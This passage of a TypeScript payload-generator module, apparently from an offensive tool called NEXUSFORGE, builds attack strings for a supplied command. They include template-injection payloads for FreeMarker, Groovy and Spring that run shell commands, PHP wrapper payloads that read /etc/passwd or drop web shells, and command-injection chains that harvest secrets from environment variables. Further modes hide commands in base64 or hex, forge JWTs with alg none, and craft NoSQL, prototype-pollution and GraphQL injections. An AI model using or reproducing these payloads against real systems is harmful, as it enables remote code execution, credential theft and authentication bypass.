        `${"${"}T(java.lang.Runtime).getRuntime().exec(T(java.util.Arrays).asList("sh","-c","${b.replace(/"/g,'\\"')}").toArray(new String[0]))${"}"}`,
      ];

    case "freemarker":
      return [
        `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("${b.replace(/"/g,'\\"')}")}`,
        `<#assign s="freemarker.template.utility.Execute"?new()>\${s("${b.replace(/"/g,'\\"')}")}`,
        `[#assign ex = "freemarker.template.utility.Execute"?new()][#assign o = ex("${b.replace(/"/g,'\\"')}")]\${o}`,
        `${"${"}"freemarker.template.utility.Execute"?new()("${b.replace(/"/g,'\\"')}")}${"}"} `,
        `<#assign walker=["freemarker.template.utility.Execute"]?new()>\${walker("${b.replace(/"/g,'\\"')}")}`,
        `<#attempt><#assign s="freemarker.template.utility.Execute"?new()>\${s("${b.replace(/"/g,'\\"')}")}<#recover></#attempt>`,
        `<#setting locale="en_US"><#assign ex="freemarker.template.utility.Execute"?new()>\${ex("${b.replace(/"/g,'\\"')}")}`,
        `<#assign s="freemarker.template.utility.Execute"?new()><#list s("${b.replace(/"/g,'\\"')}")?split("\\n") as l>\${l}</#list>`,
        `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
        `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("whoami")}`,
        `<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=dwf.getClass().forName("freemarker.template.utility.Execute")>\${dwf.newInstance(ec,null)("${b.replace(/"/g,'\\"')}")}`,
      ];

    case "groovy":
      return [
        `"${b.replace(/"/g,'\\"')}".execute().text`,
        `['bash','-c','${b.replace(/'/g,"\\'")}'].execute().text`,
        `['/bin/sh','-c','${b.replace(/'/g,"\\'")}'].execute().text`,
        `def c="${b.replace(/"/g,'\\"')}".execute();c.waitFor();c.text`,
        `new ProcessBuilder(["/bin/sh","-c","${b.replace(/"/g,'\\"')}"]).redirectErrorStream(true).start().inputStream.text`,
        `Runtime.runtime.exec("${b.replace(/"/g,'\\"')}").text`,
        `"id".execute().text`,
        `"whoami".execute().text`,
        `"cat /etc/passwd".execute().text`,
        `def b=new String(Base64.decoder.decode('${b64s}'));b.execute().text`,
        `this.class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("${b.replace(/"/g,'\\"')}").text`,
        `groovy.util.Eval.me("'${b.replace(/'/g,"\\'")}' as GString")`,
        `@Grab('commons-io:commons-io:2.4') import org.apache.commons.io.IOUtils;IOUtils.toString("${b.replace(/"/g,'\\"')}".execute().getInputStream(),"UTF-8")`,
        `Thread.currentThread().contextClassLoader.loadClass("java.lang.Runtime").getRuntime().exec("${b.replace(/"/g,'\\"')}").text`,
      ];

    case "php_wrapper":
      return [
        `php://filter/convert.base64-encode/resource=/etc/passwd`,
        `php://filter/read=string.rot13/resource=/etc/passwd`,
        `php://filter/read=convert.base64-encode/resource=index.php`,
        `data://text/plain,<?php system('${b.replace(/'/g,"\\'")}'); ?>`,
        `data://text/plain;base64,${b64(b64(`<?php system('${b.replace(/'/g,"\\'")}'); ?>`))}`,
        `expect://${b}`,
        `php://input`,
        `phar://./uploads/shell.phar/shell.php`,
        `zip://uploads/shell.zip#shell.php`,
        `php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=/etc/passwd`,
        `data://text/plain;base64,${b64(`<?php system($_GET['c']); ?>`)}`,
        `php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd`,
        `glob:///etc/p*`,
        `php://filter/string.strip_tags/resource=/etc/passwd`,
        `php://filter/read=string.toupper/resource=/etc/passwd`,
        `compress.zlib:///etc/passwd`,
        `compress.bzip2:///etc/passwd`,
      ];


    /* ═══ NEXUSFORGE upgrade: previously-missing injection mode handlers ═══ */

    case "classic":
      return [
        `${b} && id && uname -a && hostname && whoami`,
        `${b}; cat /etc/passwd | head -5`,
        `${b}; ls -la /root 2>/dev/null || ls -la /home`,
        `${b} && env | grep -iE 'pass|key|secret|token|api|cred|aws'`,
        `${b} && find / -perm -4000 -type f 2>/dev/null | head -8`,
        `${b} && cat /proc/self/environ | tr '\0' '\n'`,
        `${b} && ss -tulpn 2>/dev/null || netstat -tulpn`,
        `${b} && cat /proc/version; lsb_release -a 2>/dev/null`,
        `${b} && df -h; free -m; uptime; who`,
        `${b}; cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null`,
        `${b} && find / -name "*.env" -o -name "*.cfg" 2>/dev/null | head -6`,
        `${b} && iptables -L 2>/dev/null; cat /etc/hosts`,
        `${b} && last | head -10; w`,
        `${b} && ps aux | head -20`,
      ];

    case "polymorphic": {
      const polyB64x2 = b64(b64s);
      return [
        `$(printf '${hex}')`,
        `bash<<<$(printf '${hex}')`,
        `_y="${polyB64x2}";bash<<<$(echo "$_y"|base64 -d|base64 -d)`,
        `eval $(printf '%b' '${hex}')`,
        `${b.replace(/([a-z])([a-z])/g, (_: string, a: string, c: string) => a + "''" + c)}`,
        `{ _p="${b64s}"; bash<<<$(echo "$_p"|base64 -d); }`,
        `echo ${b64s}|base64 -d|bash`,
        `source <(echo ${b64s}|base64 -d)`,
        `bash <(printf '${hex}')`,
        `echo ${rawHex(b)}|xxd -r -p|bash`,
        `{ _a="${b64s}"; bash<<<$(echo "$_a"|base64 -d); }`,
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64s}').decode())"`,
        `perl -e "use MIME::Base64;system(decode_base64('${b64s}'))" 2>/dev/null`,
        `ruby -e "require 'base64';system(Base64.decode64('${b64s}'))" 2>/dev/null`,
      ];
    }

    default:
      return [
        `${b} && id && uname -a && hostname`,
        `${b}; cat /etc/passwd`,
        `${b}; ls -la /`,
        `${b} && env | grep -iE 'pass|key|secret|token|api|cred'`,
        `${b} && find / -perm -4000 -type f 2>/dev/null | head -10`,
        `${b} && cat /proc/self/environ | tr '\\0' '\\n'`,
        `${b} && ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null`,
        `${b} && nc -zv ${attackerIp} ${attackerPort} 2>&1`,
        `${b} && cat /proc/version; lsb_release -a 2>/dev/null`,
        `${b} && df -h; free -m; uptime`,
        `${b} && ls -la /home; ls -la /root 2>/dev/null`,
        `${b} && find / -name "*.env" -o -name "config.php" -o -name "*.cfg" 2>/dev/null | head -8`,
        `${b} && cat /proc/1/cmdline | tr '\\0' ' '`,
        `${b} && ls -la /var/www/ 2>/dev/null`,
        `${b} && find / -writable -type d 2>/dev/null | head -10`,
        `${b} && cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null`,
        `${b} && ps aux`,
        `${b} && last; who`,
        `${b} && iptables -L 2>/dev/null`,
        `${b} && cat /etc/hosts`,
      ];
  }
}

export interface PayloadOpts {
  attackerIp?:   string;
  attackerPort?: string | number;
  cbUrl?:        string;
  token?:        string;
  [key: string]: unknown;
}

export interface PayloadMode {
  id:          string;
  label:       string;
  description: string;
  generate(target: string, opts: PayloadOpts): string[];
}

export const BASE_MODES: PayloadMode[] = [];

export const EXTRA_MODES: PayloadMode[] = [
  {
    id:"jwt_attack", label:"JWT Attack", description:"JWT none/alg-confusion/kid injection payloads",
    generate(_target: string, _opts: PayloadOpts): string[] {
      const header = Buffer.from('{"alg":"none","typ":"JWT"}').toString('base64url');
      const claim  = Buffer.from(`{"sub":"admin","role":"admin","iat":${Math.floor(Date.now()/1000)}}`).toString('base64url');
      return [
        `${header}.${claim}.`,
        `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.`,
        `{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'nx_secret' --"}`,
        `{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}`,
        `{"alg":"none","typ":"JWT"}`,
      ];
    }
  },
  {
    id:"nosql_injection", label:"NoSQL Injection", description:"MongoDB/CouchDB operator injection payloads",
    generate(_target: string, _opts: PayloadOpts): string[] {
      return [
        `{"username":{"$gt":""},"password":{"$gt":""}}`,
        `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`,
        `{"username":{"$regex":"^admin"},"password":{"$gt":""}}`,
        `{"username":{"$where":"function(){return true}"},"password":"x"}`,
        `{"$where":"this.password.match(/.*/)"}`,
        `username[$gt]=&password[$gt]=`,
        `username[$ne]=invalid&password[$ne]=invalid`,
        `username[$regex]=^admin&password[$gt]=`,
        `{"selector":{"_id":{"$gt":null}}}`,
      ];
    }
  },
  {
    id:"prototype_pollution", label:"Prototype Pollution", description:"JavaScript __proto__/constructor.prototype pollution",
    generate(_target: string, _opts: PayloadOpts): string[] {
      return [
        `{"__proto__":{"isAdmin":true}}`,
        `{"__proto__":{"role":"admin","authorized":true}}`,
        `{"constructor":{"prototype":{"isAdmin":true}}}`,
        `?__proto__[isAdmin]=true`,
        `?__proto__.role=admin`,
        `?constructor.prototype.isAdmin=true`,
        `{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /dev/stdin"}}`,
        `%5B__proto__%5D%5BisAdmin%5D=true`,
        `{"a":1,"__proto__":{"polluted":true,"isAdmin":1}}`,
      ];
    }
  },
  {
    id:"graphql_injection", label:"GraphQL Injection", description:"GraphQL introspection, DoS, injection, IDOR",
    generate(_target: string, _opts: PayloadOpts): string[] {
      return [
        `{"query":"{__schema{queryType{name}types{name,kind,fields{name}}}}"}`,
        `{"query":"{__typename}"}`,
        `{"query":"{user(id:\\"1 OR 1=1\\"){id,username,email}}"}`,
        `{"query":"mutation{login(username:\\"admin\\" password:\\"' OR '1'='1\\"){token}}"}`,
        `[{"query":"{user(id:1){username}}"},{"query":"{user(id:2){username}}"}]`,
        `{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}}}"}`,
        `{"query":"{${Array(100).fill("nx:__typename").join(",")}}"}`,
        `{"query":"{users{id,username,email,password,isAdmin}}"}`,
        `{"query":"query{...F}fragment F on Query{users{password,secretToken}}"}`,
      ];
    }
  },
];

export function getAllModes(): PayloadMode[] {
  return [...BASE_MODES, ...EXTRA_MODES];
}
